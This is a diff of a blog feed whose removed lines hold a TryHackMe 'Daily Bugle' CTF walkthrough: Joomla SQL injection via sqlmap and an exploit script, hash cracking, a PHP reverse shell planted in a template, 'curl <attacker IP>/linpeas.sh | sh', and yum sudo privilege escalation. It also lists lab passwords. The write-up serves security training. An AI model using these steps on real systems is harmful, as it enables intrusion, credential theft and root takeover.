-<h3 id="21-what-is-the-joomla-version">2.1 What is the Joomla version?</h3>
-
-<p>Now, let’s do a gobuster scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.139.115/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/gobuster.png" alt="gobuster" /></p>
-
-<p>Let’s do a scan using joomscan to find the Joomla version.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ joomscan --url http://10.10.139.115/
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/joomscan.png" alt="joomscan" /></p>
-
-<p>We found the Joomla version. It is 3.7.0.</p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.7.0</code></strong></p>
-
-<p><br /></p>
-
-<p><em>Instead of using SQLMap, why not use a python script!</em></p>
-
-<h3 id="22-what-is-jonahs-cracked-password">2.2 What is Jonah’s cracked password?</h3>
-
-<p>With the Joomla version we found, we now search in exploit-db and see if we can find anything.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/search.png" alt="search" /></p>
-
-<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033">CVE-2017-8917</a>.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/db.png" alt="db" /></p>
-
-<p>You can progress using <strong><code class="language-plaintext highlighter-rouge">sqlmap</code></strong> here, but I will use a python script written for faster results. Still below is the code for sqlmap</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/sql.png" alt="sql" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/sqlmap.png" alt="sqlmap" /></p>
-
-<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla">here</a>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
-$ python joomblah http://10.10.139.115/
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/joomblah.png" alt="joomblah" /></p>
-
-<p>We found this hash code for Jonah’s password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
-</code></pre></div></div>
-
-<p>Let’s crack this hash.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/john.png" alt="john" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman123</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="23-what-is-the-user-flag">2.3 What is the user flag?</h3>
-
-<p>Go to the administrator directory and login with <strong><code class="language-plaintext highlighter-rouge">jonah:spiderman123</code></strong></p>
-
-<p>We are looking for a suitable place for any reverse shell. We go to where the .php pages are located.</p>
-
-<p>First, we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong> from the left sidebar.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/step1.png" alt="step1" /></p>
-
-<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong>  again on the page we go to.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/step2.png" alt="step2" /></p>
-
-<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Beez3 Details and Files</code></strong>.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/step3.png" alt="step3" /></p>
-
-<p>And we have reached the source files, and from here we can put our reverse shell in the index.php file.
-You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/step4.png" alt="step4" /></p>
-
-<p>Don’t forget to change this.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/change.png" alt="change" /></p>
-
-<p>Now, we modify the contents of index.php.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/index.png" alt="index" /></p>
-
-<p>We set up a netcat listener before opening the index.php page.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
-
-<p>And we are inside.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/in.png" alt="in" /></p>
-
-<p>The first thing on the server was to list the /home directory and find users.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/ls.png" alt="ls" /></p>
-
-<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312">linpeas.sh</a> and run it on the target machine.</p>
-
-<p>First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python -m http.server 80
-</code></pre></div></div>
-
-<p>Then I run the following code on the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh 
-</code></pre></div></div>
-
-<p>And it worked, let’s see what we find.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/run.png" alt="run" /></p>
-
-<p>We found a password but I have no idea what password it is.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/pass.png" alt="pass" /></p>
-
-<p>Let’s try it for jjameson.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/jj.png" alt="jj" /></p>
-
-<p>We also found the jjameson password<strong><code class="language-plaintext highlighter-rouge">(nv5uz9r3ZEDzVjNu)</code></strong></p>
-
-<p>Now we can go to the jjameson directory and get the user flag.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/jjameson
-$ ls -la
-$ cat user.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/user.png" alt="user" /></p>
-
-<p><br /></p>
-
-<h3 id="24-what-is-the-root-flag">2.4 What is the root flag?</h3>
-
-<p>Now, I check by doing <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/yum.png" alt="yum" /></p>
-
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/">gftobins</a> to get root privileges using yum.</p>
-
-<p>And let’s try this.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/gtfobins.png" alt="gtfobins" /></p>
-
-<p>Yes, it worked.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/privesc.png" alt="privesc" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /root
-$ ls -la
-$ cat root.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/root.png" alt="root" /></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="sqli," /><category term="yum," /><category term="joomla" /><summary type="html"><![CDATA[Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/daily-bugle.png" /><media:content medium="image" url="http://localhost:4000/assets/img/daily-bugle.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="pentest," /><category term="security," /><category term="accessible" /><summary type="html"><![CDATA[Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/relevant.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/relevant.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
